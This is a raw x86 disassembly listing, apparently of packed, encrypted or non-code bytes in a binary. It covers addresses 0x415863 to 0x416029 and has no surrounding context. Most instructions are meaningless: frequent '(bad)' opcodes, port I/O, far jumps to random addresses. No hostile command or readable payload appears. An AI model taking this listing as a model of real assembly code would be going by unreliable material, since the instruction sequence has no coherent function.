  415863:	js     0x4157f3
  415865:	(bad)  [edx-0x4a00a0d5]
  41586b:	in     al,0x53
  41586d:	aam    0xa5
  41586f:	pusha  
  415870:	adc    edx,esp
  415872:	hlt    
  415873:	inc    edi
  415874:	(bad)  
  415875:	fsubr  QWORD PTR [esi]
  415877:	inc    esp
  415878:	inc    ebx
  415879:	pop    ebx
  41587a:	push   ecx
  41587b:	inc    ecx
  41587c:	dec    ecx
  41587d:	xchg   DWORD PTR [ebp+0x545eaee3],eax
  415883:	xchg   ebx,eax
  415884:	les    esp,FWORD PTR [edi-0x5164106b]
  41588a:	xchg   BYTE PTR [eax+eiz*4],cl
  41588d:	fcomp  st(5)
  41588f:	mov    ebp,0xea67deaa
  415894:	or     al,0xa2
  415896:	or     DWORD PTR [esi+esi*1],edi
  415899:	pop    eax
  41589a:	loop   0x415907
  41589c:	lods   al,BYTE PTR ds:[esi]
  41589d:	in     eax,0x3c
  41589f:	aad    0x50
  4158a1:	fwait
  4158a2:	sub    BYTE PTR [edi+0x2741e6f5],bl
  4158a8:	hlt    
  4158a9:	(bad)  
  4158ab:	push   0xffffffb9
  4158ad:	ss js  0x4158da
  4158b0:	aaa    
  4158b1:	inc    edi
  4158b2:	jo     0x415834
  4158b4:	aad    0x9a
  4158b6:	stc    
  4158b7:	xor    eax,0xa5d5d42e
  4158bc:	cdq    
  4158bd:	(bad)  
  4158be:	xchg   esp,eax
  4158bf:	(bad)  
  4158c0:	call   0x1641:0x65766255
  4158c7:	sub    edi,eax
  4158c9:	loopne 0x415853
  4158cb:	call   0x2934da67
  4158d0:	adc    BYTE PTR [esi-0x554f5f5c],cl
  4158d6:	(bad)  [ecx]
  4158d8:	mov    ebp,0x69585726
  4158dd:	mov    eax,ds:0x891b9dab
  4158e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158e3:	sbb    DWORD PTR [ebp+ebx*1+0x652001e3],esp
  4158ea:	inc    ecx
  4158eb:	call   0x82dc:0x40bdd224
  4158f2:	imul   ebx,DWORD PTR [eax-0x57b4b9e7],0x69
  4158f9:	add    al,0x8d
  4158fb:	sbb    al,0x5d
  4158fd:	js     0x4158cb
  4158ff:	jge    0x4158ff
  415901:	je     0x415961
  415903:	dec    ecx
  415904:	pop    ebp
  415905:	push   es
  415906:	popa   
  415907:	sbb    BYTE PTR [edx],bl
  415909:	jns    0x4158d3
  41590b:	sbb    edx,0xffffffb6
  41590e:	push   esi
  41590f:	shr    DWORD PTR [edx],1
  415911:	and    eax,0xd0f86934
  415916:	push   ss
  415917:	mov    dl,al
  415919:	jns    0x41595d
  41591b:	push   ss
  41591c:	push   0xa2a098c7
  415921:	jle    0x415929
  415923:	cwde   
  415924:	xchg   esi,edi
  415926:	or     al,0x36
  415928:	push   es
  415929:	add    al,0xdc
  41592b:	pop    ebp
  41592c:	mov    ah,0x35
  41592e:	je     0x41596c
  415930:	nop
  415931:	cs mov bh,0x65
  415934:	xchg   DWORD PTR [ebx-0x399bb74],edx
  41593a:	in     eax,dx
  41593b:	in     eax,0xe8
  41593d:	out    0x1,eax
  41593f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415940:	repz data16 aaa 
  415943:	xchg   esi,eax
  415944:	jmp    0x7e93daa2
  415949:	cmp    esp,DWORD PTR [edx+0x227609f5]
  41594f:	sbb    BYTE PTR [esi],0x4a
  415952:	push   bp
  415954:	pop    esi
  415955:	ja     0x4158de
  415957:	jns    0x41596b
  415959:	adc    eax,0xd3f76468
  41595e:	lea    ebx,[edi+0x3f]
  415961:	fstp   DWORD PTR [ecx-0x1d75888f]
  415967:	add    ah,bl
  415969:	jmp    0x41599c
  41596b:	shr    BYTE PTR [ebx-0x12],cl
  41596e:	outs   dx,DWORD PTR ds:[esi]
  41596f:	push   0x1d
  415971:	mov    cl,0x7b
  415973:	mov    BYTE PTR [ebx],dl
  415975:	push   ss
  415976:	mov    al,ds:0x1bd3d6a0
  41597b:	mov    ds:0xe8f7dbc4,eax
  415981:	lahf   
  415982:	bound  esp,QWORD PTR [edx-0x5bd67f88]
  415988:	jb     0x415a00
  41598a:	push   ecx
  41598b:	mov    cl,0xb9
  41598d:	outs   dx,DWORD PTR ds:[esi]
  41598e:	xor    esi,DWORD PTR ds:0x88048987
  415994:	mov    cl,0x77
  415996:	xor    BYTE PTR [ecx],ch
  415998:	test   eax,0xbd060c11
  41599d:	push   es
  41599e:	imul   ecx,DWORD PTR [edi],0x690f8653
  4159a4:	clc    
  4159a5:	mov    eax,DWORD PTR [esi]
  4159a7:	jmp    0x41594e
  4159a9:	pop    edx
  4159aa:	pop    ebp
  4159ab:	jae    0x41598c
  4159ad:	lods   eax,DWORD PTR ds:[esi]
  4159ae:	not    BYTE PTR [eax-0x22]
  4159b1:	ins    DWORD PTR es:[edi],dx
  4159b2:	mov    esp,0xd36f48d5
  4159b7:	enter  0x2f7d,0xf
  4159bb:	repz adc al,0xfa
  4159be:	and    al,0xd
  4159c0:	adc    al,0x36
  4159c2:	jmp    DWORD PTR [eax]
  4159c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159c5:	pushf  
  4159c6:	xchg   ebp,eax
  4159c7:	jmp    0x8c844f81
  4159cc:	inc    ecx
  4159cd:	rcl    DWORD PTR [ebx],1
  4159cf:	fild   DWORD PTR [edi+0x392dc44e]
  4159d5:	jb     0x4159a1
  4159d7:	out    dx,eax
  4159d8:	pop    ebx
  4159d9:	int    0x1d
  4159db:	cmp    cl,dh
  4159dd:	mov    WORD PTR [edx-0x4b],ds
  4159e0:	add    bh,cl
  4159e2:	xor    al,0x37
  4159e4:	inc    esp
  4159e5:	xor    DWORD PTR [eax],edx
  4159e7:	lahf   
  4159e8:	push   edi
  4159e9:	das    
  4159ea:	dec    esi
  4159eb:	pusha  
  4159ec:	mov    dl,0x20
  4159ee:	inc    eax
  4159ef:	stc    
  4159f0:	push   esp
  4159f1:	jle    0x415a2f
  4159f3:	add    al,0xd2
  4159f5:	out    dx,al
  4159f6:	inc    ebx
  4159f7:	movq   mm7,QWORD PTR [esi]
  4159fa:	and    DWORD PTR [ecx-0x4b],esp
  4159fd:	es push cs
  4159ff:	pop    ds
  415a00:	sbb    dh,BYTE PTR gs:[edx]
  415a03:	xchg   ebx,eax
  415a04:	out    dx,eax
  415a05:	xlat   BYTE PTR ds:[ebx]
  415a06:	shl    DWORD PTR [ecx+0x7e2fcb86],0x6b
  415a0d:	icebp  
  415a0e:	bound  ebx,QWORD PTR [edi-0x12]
  415a11:	sbb    DWORD PTR [ebx+0x3a37a6e2],edx
  415a17:	jecxz  0x4159bb
  415a19:	fidivr WORD PTR ds:0x2656708d
  415a1f:	sub    eax,DWORD PTR [ebp-0x679bf7b7]
  415a25:	sbb    ecx,edx
  415a27:	hlt    
  415a28:	popf   
  415a29:	mov    al,0xc2
  415a2b:	xchg   esi,eax
  415a2c:	imul   ecx,esi,0x2e
  415a2f:	imul   ecx,DWORD PTR [ebx+ecx*4],0x5706b6a7
  415a36:	nop
  415a37:	jo     0x415a01
  415a39:	jle    0x415ab3
  415a3b:	pop    edx
  415a3c:	test   eax,0xd336dfae
  415a41:	inc    ebx
  415a42:	in     eax,0xa4
  415a44:	mov    bh,0xfd
  415a46:	mov    bl,0x5d
  415a48:	xchg   edx,eax
  415a49:	mov    WORD PTR [edx-0x37],ax
  415a4d:	dec    DWORD PTR ds:0xaa8d20c
  415a53:	mov    DWORD PTR [ecx+ebp*8+0x69870cca],ebx
  415a5a:	xor    ah,al
  415a5c:	cmc    
  415a5d:	sub    bl,BYTE PTR [edi]
  415a5f:	mov    al,ds:0xaf0f12aa
  415a64:	mov    esi,0x3cdeb580
  415a69:	sub    DWORD PTR [ebp-0x550d94b],esp
  415a6f:	mov    BYTE PTR [esi+0x37],bh
  415a72:	std    
  415a73:	sbb    ch,bl
  415a75:	jo     0x415add
  415a77:	mov    bl,0x3
  415a79:	div    DWORD PTR [esp+edi*1+0x324b671b]
  415a80:	(bad)  
  415a82:	jmp    0x80b3873a
  415a87:	ror    DWORD PTR [ebx+0x363ef019],0x3f
  415a8e:	loop   0x415a5c
  415a90:	int    0x79
  415a92:	adc    al,0x3
  415a94:	and    eax,0xbd75e5b1
  415a99:	popa   
  415a9a:	aaa    
  415a9b:	inc    DWORD PTR [ebx]
  415a9d:	inc    ecx
  415a9e:	cmp    eax,0x44be1a5e
  415aa3:	sub    ecx,DWORD PTR [ebx-0x6596dc4d]
  415aa9:	add    al,0xe1
  415aab:	or     al,0xd7
  415aae:	pop    esi
  415aaf:	inc    ebp
  415ab0:	das    
  415ab1:	(bad)  
  415ab2:	sti    
  415ab3:	cmp    BYTE PTR [eax],bh
  415ab5:	iret   
  415ab6:	retf   
  415ab7:	or     bh,BYTE PTR [ebx+0x1b]
  415aba:	inc    edi
  415abb:	pusha  
  415abc:	cli    
  415abd:	dec    edx
  415abe:	(bad)  
  415abf:	(bad)  
  415ac0:	jp     0x415af0
  415ac2:	int3   
  415ac3:	arpl   WORD PTR [ecx],sp
  415ac5:	in     eax,dx
  415ac6:	jbe    0x415a79
  415ac8:	loope  0x415a60
  415aca:	cmp    eax,0x5f94dc87
  415acf:	jne    0x415abd
  415ad1:	(bad)  
  415ad2:	imul   ebx,DWORD PTR [edi+0x16],0xfdba7ecb
  415ad9:	rsqrtps xmm7,XMMWORD PTR [ecx-0x7c8fee57]
  415ae0:	mov    ebx,0xaab68806
  415ae5:	sub    esi,DWORD PTR [ecx-0x57e89fb7]
  415aeb:	(bad)  
  415aec:	pop    ss
  415aed:	cmp    al,0x84
  415aef:	fbstp  TBYTE PTR [ebx]
  415af1:	fadd   QWORD PTR [edx+ebp*8]
  415af4:	adc    eax,DWORD PTR [edx]
  415af6:	hlt    
  415af7:	cmc    
  415af8:	push   edx
  415af9:	cmc    
  415afa:	(bad)  
  415afb:	outs   dx,BYTE PTR ds:[esi]
  415afc:	sqrtps xmm1,xmm6
  415aff:	lods   al,BYTE PTR ds:[esi]
  415b00:	sar    DWORD PTR [esp+edi*1+0x78],cl
  415b04:	push   0xffffffea
  415b06:	cmp    eax,0xdde95049
  415b0b:	fs or  eax,0x7131f31d
  415b11:	bound  edi,QWORD PTR [edx-0x7303a96e]
  415b17:	sahf   
  415b18:	jle    0x415b2e
  415b1a:	and    edi,DWORD PTR [ecx]
  415b1c:	inc    eax
  415b1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b1f:	out    dx,al
  415b20:	dec    edi
  415b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b22:	mov    ebp,0x341244d5
  415b27:	repz cmp al,0xe3
  415b2a:	pop    ss
  415b2b:	aad    0x9c
  415b2d:	dec    ecx
  415b2e:	out    dx,al
  415b2f:	imul   ecx,DWORD PTR [eax],0xfffffff9
  415b32:	scas   eax,DWORD PTR es:[edi]
  415b33:	push   ebx
  415b34:	imul   eax,edi,0x197815
  415b3a:	pop    esp
  415b3b:	or     eax,0x241b25f4
  415b40:	pop    esi
  415b41:	out    0xd2,eax
  415b43:	pop    ds
  415b44:	stos   DWORD PTR es:[edi],eax
  415b45:	cld    
  415b46:	cwde   
  415b47:	sbb    al,0xf6
  415b49:	(bad)  
  415b4a:	sbb    eax,0x63486b3f
  415b4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b50:	ffree  st(4)
  415b52:	cmp    ah,ch
  415b54:	imul   esi,DWORD PTR [esp+0x41],0xffffff94
  415b59:	pop    esp
  415b5a:	mov    BYTE PTR [edx],dh
  415b5c:	or     eax,0x9eab890d
  415b61:	mov    dl,0xd2
  415b63:	in     al,0x18
  415b65:	mov    ebx,0xa8e5aff1
  415b6a:	daa    
  415b6b:	jb     0x415b75
  415b6d:	xor    al,0x11
  415b6f:	in     al,0x92
  415b71:	push   ebp
  415b72:	inc    ebx
  415b73:	sbb    DWORD PTR [eax-0x42f122a5],esi
  415b79:	pop    ebx
  415b7a:	out    dx,al
  415b7b:	lock sbb ah,BYTE PTR gs:[edx+0x3d7f3265]
  415b83:	int3   
  415b84:	test   eax,0x946bb74e
  415b89:	dec    ebx
  415b8a:	icebp  
  415b8b:	(bad)  
  415b8d:	repnz ins DWORD PTR es:[edi],dx
  415b8f:	test   BYTE PTR gs:[edi-0x71d6659d],bh
  415b96:	in     al,0x17
  415b98:	in     eax,dx
  415b99:	add    ebp,DWORD PTR [ebp+0x4e648bc1]
  415b9f:	pop    ecx
  415ba0:	xor    DWORD PTR [edi+0x4297bbb4],esp
  415ba6:	arpl   WORD PTR [ebx+0x7523c561],di
  415bac:	mov    esi,0xb932772d
  415bb1:	inc    ebx
  415bb2:	dec    ebp
  415bb3:	jne    0x415ba7
  415bb5:	mov    dl,0xe0
  415bb7:	adc    edx,DWORD PTR [bx+si-0x2e55]
  415bbc:	into   
  415bbd:	xor    edi,DWORD PTR [ebp-0x50]
  415bc0:	add    ecx,DWORD PTR [edi]
  415bc2:	and    bh,BYTE PTR [ebx+0x65]
  415bc5:	ins    BYTE PTR es:[edi],dx
  415bc6:	jge    0x415bce
  415bc8:	dec    edx
  415bc9:	push   esi
  415bca:	jle    0x415b64
  415bcc:	sub    edx,DWORD PTR [ebx-0x10]
  415bcf:	jle    0x415c2b
  415bd1:	aad    0x6f
  415bd3:	gs out dx,al
  415bd5:	inc    ebp
  415bd6:	bound  esi,QWORD PTR [eax+0x37e8f8c3]
  415bdc:	xor    al,0xd6
  415bde:	dec    ebx
  415bdf:	sub    esp,DWORD PTR [esi]
  415be1:	inc    esp
  415be2:	xchg   edx,eax
  415be3:	add    al,0xc9
  415be5:	ret    0xaaa
  415be8:	xor    edx,DWORD PTR ds:0x8b9ceb7e
  415bee:	in     eax,dx
  415bef:	(bad)  
  415bf0:	das    
  415bf1:	aaa    
  415bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bf3:	and    BYTE PTR [esi+ecx*1+0x37cce2ae],dh
  415bfa:	adc    eax,DWORD PTR [ecx]
  415bfc:	sub    BYTE PTR [eax-0x72ed7057],ch
  415c02:	js     0x415bb4
  415c04:	push   esi
  415c05:	xchg   edx,eax
  415c06:	inc    ebp
  415c07:	mov    WORD PTR [esi],es
  415c09:	inc    ebx
  415c0a:	mov    ebx,0x60ac4688
  415c0f:	(bad)  
  415c10:	lahf   
  415c11:	inc    edi
  415c12:	mov    ?,WORD PTR [ecx-0x229e7028]
  415c18:	ret    0x8b56
  415c1b:	xchg   ebx,eax
  415c1c:	(bad)  
  415c1d:	(bad)  
  415c1f:	sub    eax,0x6a032b8f
  415c24:	lods   eax,DWORD PTR ds:[esi]
  415c25:	mov    esp,0x97ca288e
  415c2a:	mov    eax,0x85b13bb8
  415c2f:	xchg   ecx,eax
  415c30:	hlt    
  415c31:	xor    DWORD PTR [edx-0x61],esi
  415c34:	jmp    0xa38b9887
  415c39:	fistp  DWORD PTR [edi-0x3f]
  415c3c:	jmp    DWORD PTR [edx+0x64095450]
  415c42:	fist   WORD PTR [ebx-0x15]
  415c45:	and    eax,ecx
  415c47:	cmp    esi,DWORD PTR [esp+eiz*4]
  415c4a:	jo     0x415bd5
  415c4c:	cmp    eax,0x1e8c80c1
  415c51:	dec    esi
  415c52:	loope  0x415ca8
  415c54:	mov    ch,0x81
  415c56:	nop
  415c57:	mov    ah,0x62
  415c59:	aad    0x8a
  415c5b:	aaa    
  415c5c:	or     ebx,DWORD PTR ds:0xcc536b6e
  415c62:	push   0x41
  415c64:	aam    0xa0
  415c66:	es aam 0x3e
  415c69:	repnz nop
  415c6b:	retf   0x6581
  415c6e:	mov    bh,BYTE PTR [edx+0x43]
  415c71:	dec    ecx
  415c72:	jnp    0x415cca
  415c74:	pop    edx
  415c75:	icebp  
  415c76:	mov    ah,0x46
  415c78:	icebp  
  415c79:	dec    esp
  415c7a:	sub    cl,BYTE PTR [edx-0x41]
  415c7d:	and    DWORD PTR [ecx],0x3cd6be7c
  415c83:	xchg   BYTE PTR [edx],dh
  415c85:	pop    esi
  415c86:	int3   
  415c87:	repnz cmc 
  415c89:	xor    cl,bh
  415c8b:	ss cld 
  415c8d:	dec    eax
  415c8e:	daa    
  415c8f:	sub    dh,BYTE PTR [ebx-0x765eb17b]
  415c95:	cdq    
  415c96:	adc    DWORD PTR [ebx-0xa],ebx
  415c99:	jecxz  0x415c6d
  415c9b:	sbb    al,0x2e
  415c9d:	adc    al,BYTE PTR ds:0xa60e4e02
  415ca3:	rcr    DWORD PTR [ebx],1
  415ca5:	rcl    DWORD PTR [ebp+0x2f],0x2e
  415ca9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415caa:	shl    BYTE PTR [eax-0x2c9a8567],cl
  415cb0:	pop    ebx
  415cb1:	and    edi,DWORD PTR [eax]
  415cb3:	xchg   ebp,eax
  415cb4:	fucomp st(1)
  415cb6:	mov    eax,0x8dbcd300
  415cbb:	dec    esi
  415cbc:	adc    DWORD PTR [ecx],0xbc2efee6
  415cc2:	mov    edi,0x30a46d1f
  415cc7:	push   eax
  415cc8:	(bad)  
  415cc9:	test   eax,0xdbbb56e8
  415cce:	std    
  415ccf:	xchg   edx,eax
  415cd0:	daa    
  415cd1:	outs   dx,DWORD PTR ds:[esi]
  415cd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cd3:	lea    edx,[esi-0x52847787]
  415cd9:	lock cwde 
  415cdb:	mov    eax,ds:0x489145cb
  415ce0:	jne    0x415d35
  415ce2:	rcl    DWORD PTR [esi+0xee48c88],0x86
  415ce9:	or     BYTE PTR [edi+eiz*8+0x62],ah
  415ced:	adc    eax,0x86955dd
  415cf2:	cmp    DWORD PTR [ecx-0x75dfff36],ebp
  415cf8:	mov    ?,eax
  415cfa:	sub    eax,0xfb3f2777
  415cff:	pop    esi
  415d00:	dec    ebx
  415d01:	sti    
  415d02:	out    dx,al
  415d03:	mov    al,0xb5
  415d05:	pop    ds
  415d06:	mov    ebx,0x73374927
  415d0b:	and    bl,BYTE PTR [edx+0x3a]
  415d0e:	in     eax,dx
  415d0f:	cmp    edi,DWORD PTR [edi]
  415d11:	push   edi
  415d12:	stc    
  415d13:	lods   al,BYTE PTR ds:[esi]
  415d14:	sbb    BYTE PTR [edx+0x53],al
  415d17:	rol    BYTE PTR [edx+0x21f38bd4],cl
  415d1d:	jbe    0x415d10
  415d1f:	leave  
  415d20:	arpl   WORD PTR [ebp-0x595c27a],si
  415d26:	fimul  DWORD PTR [ecx+0x3a90bf5d]
  415d2c:	mov    cl,BYTE PTR [ebp+esi*4-0x44]
  415d30:	jg     0x415d6c
  415d32:	fmul   QWORD PTR [ebx]
  415d34:	dec    edi
  415d35:	imul   edi,DWORD PTR [edi+eiz*4],0xcabab8e0
  415d3c:	adc    al,0x6a
  415d3e:	das    
  415d3f:	pop    edi
  415d40:	mov    al,0x93
  415d42:	bound  ebx,QWORD PTR [eax+0x3d3dcd27]
  415d48:	inc    edx
  415d49:	cmp    dl,BYTE PTR [ebp+0x6f06bd4a]
  415d4f:	fcmovnb st,st(3)
  415d51:	pop    ds
  415d52:	repz or bh,0xbf
  415d56:	test   eax,0x7ba2bb57
  415d5b:	sbb    al,0x36
  415d5d:	adc    BYTE PTR [ebp+0x1b2b871a],0x23
  415d64:	sbb    al,0x42
  415d66:	xchg   esi,eax
  415d67:	push   cs
  415d68:	in     al,0x34
  415d6a:	int3   
  415d6b:	dec    esi
  415d6c:	mov    esp,0x425c2293
  415d71:	shr    DWORD PTR [ebp+0x69],1
  415d74:	out    0xe2,eax
  415d76:	pop    edx
  415d77:	push   edi
  415d78:	cmp    dh,bh
  415d7a:	xchg   edx,eax
  415d7b:	jae    0x415d68
  415d7d:	mov    ds:0xa1bd739c,eax
  415d82:	fsincos 
  415d84:	xor    DWORD PTR [eax],esi
  415d86:	mov    ecx,0xc268e90
  415d8b:	arpl   WORD PTR [ecx+0x1e7cc1af],cx
  415d91:	in     eax,0x12
  415d93:	push   0xffffff87
  415d95:	jnp    0x415dff
  415d97:	and    esi,DWORD PTR [eax]
  415d99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d9a:	fiadd  DWORD PTR [edx+0x5272914d]
  415da0:	adc    ecx,ebx
  415da2:	imul   ecx,DWORD PTR [ecx+esi*2],0x3dea76eb
  415da9:	mov    ch,0xbb
  415dab:	jno    0x415dfe
  415dad:	sbb    cl,ah
  415daf:	mov    ch,0xc8
  415db1:	into   
  415db2:	fdivp  st(6),st
  415db4:	xchg   ecx,eax
  415db5:	test   al,0xb1
  415db7:	mov    esi,es
  415db9:	loope  0x415da3
  415dbb:	outs   dx,DWORD PTR ds:[esi]
  415dbc:	pop    esi
  415dbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dbe:	adc    al,BYTE PTR [ebp+esi*8-0x31076557]
  415dc5:	lock pop ecx
  415dc7:	aas    
  415dc8:	mov    ebx,0x92861e1
  415dcd:	push   ebx
  415dce:	out    0xcf,eax
  415dd0:	daa    
  415dd1:	mov    ebx,0x1b5a7371
  415dd6:	and    eax,0x31d7a7e1
  415ddb:	imul   esi,DWORD PTR [ebx+0xd96a3a4],0x2a
  415de2:	(bad)  
  415de3:	scas   eax,DWORD PTR es:[edi]
  415de4:	test   ch,bh
  415de6:	and    BYTE PTR [esi+eax*1-0x224017f9],dl
  415ded:	je     0x415d8c
  415def:	adc    BYTE PTR [esi+0x5b60ed52],dl
  415df5:	or     al,0x88
  415df7:	mov    DWORD PTR [edx+0x32],edi
  415dfa:	pop    ecx
  415dfb:	leave  
  415dfc:	pop    esp
  415dfd:	xchg   esp,eax
  415dfe:	sar    DWORD PTR [ebp+0x58],0xfa
  415e02:	xchg   ebp,eax
  415e03:	sbb    al,0xf8
  415e05:	mov    cl,0xab
  415e07:	cmp    BYTE PTR [ebp-0x23c55ab5],bh
  415e0d:	ss retf 0x66a0
  415e11:	outs   dx,DWORD PTR ds:[esi]
  415e12:	stos   BYTE PTR es:[edi],al
  415e13:	xchg   BYTE PTR [ebx+ebp*8+0x346d01e7],dh
  415e1a:	or     BYTE PTR [ecx+0x31],0x71
  415e1e:	aad    0xfa
  415e20:	cmp    DWORD PTR fs:[esi],edx
  415e23:	fdiv   DWORD PTR [ebx+0xf4660fa]
  415e29:	xlat   BYTE PTR ds:[ebx]
  415e2a:	pop    esi
  415e2b:	rcr    DWORD PTR [esi-0x31],cl
  415e2e:	jo     0x415e60
  415e30:	or     eax,DWORD PTR [edx-0x9]
  415e33:	(bad)  
  415e34:	div    DWORD PTR ds:0xe9aa6fff
  415e3a:	cdq    
  415e3b:	les    ecx,FWORD PTR [ebx+0x6b]
  415e3e:	mov    ebx,0x94883d96
  415e43:	les    esi,FWORD PTR [ecx-0x35]
  415e46:	mov    al,ds:0x334abffc
  415e4b:	fist   DWORD PTR [edx-0x42be0ef3]
  415e51:	retf   0x6af0
  415e54:	addr16 fs ja 0x415e4a
  415e58:	fsubr  DWORD PTR [eax+eax*4-0x6e9b73fd]
  415e5f:	dec    edx
  415e60:	push   cs
  415e61:	add    al,BYTE PTR ds:[eax+ecx*8]
  415e65:	add    eax,0x948d2131
  415e6a:	and    eax,0x6fdc121a
  415e6f:	xchg   edi,eax
  415e70:	fwait
  415e71:	int    0xb6
  415e73:	xchg   edi,eax
  415e74:	repnz push ebx
  415e76:	int    0x23
  415e78:	dec    ecx
  415e79:	or     eax,0x559abaeb
  415e7e:	sub    DWORD PTR [esp+ecx*8+0x7f],eax
  415e82:	gs adc eax,0xdbb386d7
  415e88:	add    BYTE PTR [edx],0x7b
  415e8b:	dec    esp
  415e8c:	mov    al,0xa4
  415e8e:	or     edx,DWORD PTR fs:[esp+edi*1+0x135ac314]
  415e96:	ds xchg ebx,eax
  415e98:	fld    DWORD PTR [ecx]
  415e9a:	mov    ebp,ebx
  415e9c:	mov    dh,0x19
  415e9e:	jns    0x415eb8
  415ea0:	fwait
  415ea1:	or     BYTE PTR [edi],dl
  415ea3:	js     0x415e2c
  415ea5:	fdivr  QWORD PTR [esi-0x6eeba69]
  415eab:	out    dx,al
  415eac:	and    al,0x59
  415eae:	rcl    ecx,cl
  415eb0:	loop   0x415e3c
  415eb2:	dec    ebp
  415eb3:	or     al,0xaf
  415eb5:	or     esi,edx
  415eb7:	mov    edx,0xc768a0ae
  415ebc:	add    DWORD PTR [esi-0x32],ebp
  415ebf:	mov    ecx,0x95f38028
  415ec4:	add    BYTE PTR [esi-0x65],cl
  415ec7:	xchg   BYTE PTR [edi-0x5],ch
  415eca:	imul   DWORD PTR [eax+0x74]
  415ecd:	fcom   st(6)
  415ecf:	jno    0x415e6b
  415ed1:	xor    BYTE PTR [esi],cl
  415ed3:	dec    ecx
  415ed4:	outs   dx,DWORD PTR ds:[esi]
  415ed5:	aad    0xe1
  415ed7:	cwde   
  415ed8:	rol    DWORD PTR [edx-0x2774d477],cl
  415ede:	mov    esi,0x2e1e6fa3
  415ee3:	push   ebx
  415ee4:	dec    esi
  415ee5:	ss cli 
  415ee7:	add    al,0x46
  415ee9:	shl    edx,1
  415eeb:	push   esp
  415eec:	mov    ch,0xdd
  415eee:	push   0x598139c6
  415ef3:	daa    
  415ef4:	xor    DWORD PTR [edx-0x67],ebx
  415ef7:	inc    eax
  415ef8:	repz cld 
  415efa:	clc    
  415efb:	scas   al,BYTE PTR es:[edi]
  415efc:	adc    eax,0x4a5fea9
  415f01:	outs   dx,BYTE PTR ds:[esi]
  415f02:	xor    edi,DWORD PTR [edi-0x53e85f86]
  415f08:	shr    BYTE PTR [ebx],cl
  415f0a:	std    
  415f0b:	add    ebx,esi
  415f0d:	in     eax,dx
  415f0e:	lock mov edx,0x2fef2643
  415f14:	ins    DWORD PTR es:[edi],dx
  415f15:	cmc    
  415f16:	jge    0x415ebe
  415f18:	lods   al,BYTE PTR ds:[esi]
  415f19:	lds    eax,FWORD PTR [eax-0x5b356db3]
  415f1f:	mov    ecx,0x2cf9c635
  415f24:	push   edx
  415f25:	dec    esi
  415f26:	jae    0x415f7a
  415f28:	add    ebx,DWORD PTR [ecx-0x2]
  415f2b:	call   0x3022fc6f
  415f30:	jmp    0x9041:0x42ed131f
  415f37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f38:	fmul   DWORD PTR [esi+0x24b6d0fd]
  415f3e:	sbb    eax,0xbeb0509a
  415f43:	push   esp
  415f44:	adc    eax,0xc8873e53
  415f49:	xchg   ebx,eax
  415f4a:	xchg   esi,eax
  415f4b:	jg     0x415f0f
  415f4d:	addr16 push 0x47
  415f50:	jb     0x415f92
  415f52:	leave  
  415f53:	fistp  QWORD PTR [edi+0x33]
  415f56:	dec    ecx
  415f57:	(bad)  
  415f59:	dec    ebx
  415f5a:	mov    al,ds:0x3c89c071
  415f5f:	cs and eax,0xa337eafd
  415f65:	inc    esp
  415f66:	mov    al,0x2d
  415f68:	dec    ebx
  415f69:	xor    al,ch
  415f6b:	test   al,0x1a
  415f6d:	xlat   BYTE PTR ds:[ebx]
  415f6e:	adc    eax,0x5700f7ff
  415f73:	sub    eax,0x3a386285
  415f78:	mov    ecx,0x1d2c8c7a
  415f7d:	lock das 
  415f7f:	outs   dx,BYTE PTR ds:[esi]
  415f80:	ds in  eax,0xf8
  415f83:	mov    edx,0x1bbbd7a7
  415f88:	sar    ah,1
  415f8a:	loopne 0x415f8b
  415f8c:	push   ds
  415f8d:	jmp    0x1c5f:0x252993e7
  415f94:	sti    
  415f95:	leave  
  415f96:	mov    ds:0xa7e42865,eax
  415f9b:	aaa    
  415f9c:	dec    ebx
  415f9d:	es dec esi
  415f9f:	pop    ebp
  415fa0:	cmc    
  415fa1:	push   0x8f06478b
  415fa6:	dec    esi
  415fa7:	loopne 0x415f2a
  415fa9:	push   edx
  415faa:	adc    BYTE PTR [eax],dl
  415fac:	pop    ebp
  415fad:	sub    bl,bl
  415faf:	mov    edi,0xa5dc053a
  415fb4:	mov    esp,ebx
  415fb6:	cmc    
  415fb7:	retf   
  415fb8:	mov    WORD PTR [ebx+0x5a],ss
  415fbb:	add    ebp,DWORD PTR [ecx-0x29fddc10]
  415fc1:	add    BYTE PTR [ebx+0x5123f3a0],cl
  415fc7:	xchg   BYTE PTR [edi+0x7a12a9c2],dh
  415fcd:	sahf   
  415fce:	add    DWORD PTR [eax],edx
  415fd0:	pslld  mm1,QWORD PTR [eax-0x468c3abf]
  415fd7:	stc    
  415fd8:	rol    BYTE PTR [ebx+0x22ae1fe9],0x9f
  415fdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fe0:	fs nop
  415fe2:	jb     0x416044
  415fe4:	jae    0x415fea
  415fe6:	push   0x95d8270a
  415feb:	cwde   
  415fec:	out    0x8,al
  415fee:	pop    edx
  415fef:	xlat   BYTE PTR ds:[ebx]
  415ff0:	add    ebp,DWORD PTR [edi-0x4d]
  415ff3:	out    dx,al
  415ff4:	ret    
  415ff5:	or     BYTE PTR [ebp+0x3f3a1c0f],dh
  415ffb:	pop    edx
  415ffc:	stos   DWORD PTR es:[edi],eax
  415ffd:	or     DWORD PTR es:[ebp-0x78],edi
  416001:	mov    ah,0xb4
  416003:	es iret 
  416005:	leave  
  416006:	test   eax,0x732c3c5a
  41600b:	fistp  WORD PTR [esi]
  41600d:	push   esi
  41600e:	leave  
  41600f:	add    esi,edi
  416011:	jmp    0x416035
  416013:	pop    ecx
  416014:	sbb    dh,BYTE PTR [esi]
  416016:	sbb    al,BYTE PTR [esi-0x7e]
  416019:	loope  0x415fd8
  41601b:	rol    BYTE PTR [ecx+0x43bc9773],cl
  416021:	adc    ebx,DWORD PTR ds:0xac559ff2
  416027:	pop    ds
  416028:	inc    ebx
  416029:	xor    bh,BYTE PTR [esi]
